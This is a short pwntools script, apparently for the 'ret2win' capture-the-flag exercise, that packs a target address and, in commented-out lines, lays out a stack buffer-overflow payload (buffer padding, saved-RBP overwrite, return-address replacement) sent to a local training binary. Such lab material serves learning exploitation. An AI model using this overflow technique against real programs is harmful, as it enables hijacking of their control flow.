from pwn import * # type: ignore

ret2win_addr = p64(0x00400757)

print(ret2win_addr)

# payload = b'A' * 32 # fill the buffer
# payload += b'B'* 8 # fill the RBP
# payload += ret2win_addr #replace the return addr

# io = process('./ret2win')
# io.sendline(payload)
# io.interactive()